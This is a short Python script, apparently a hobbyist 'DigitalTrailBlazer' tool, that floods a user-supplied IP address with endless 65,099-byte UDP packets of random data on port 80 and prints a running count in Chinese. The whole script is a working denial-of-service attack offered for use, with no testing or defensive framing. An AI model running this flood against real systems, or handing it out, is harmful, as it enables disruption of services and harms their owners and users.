import os
import socket
import random
from datetime import datetime

print("<DigitalTrailBlazer>")
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(65099)

ip = input("ip <<")
port = 80
 
sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    print("已发送 %s 个数据包到 %s 端口 %d" % (sent, ip, port))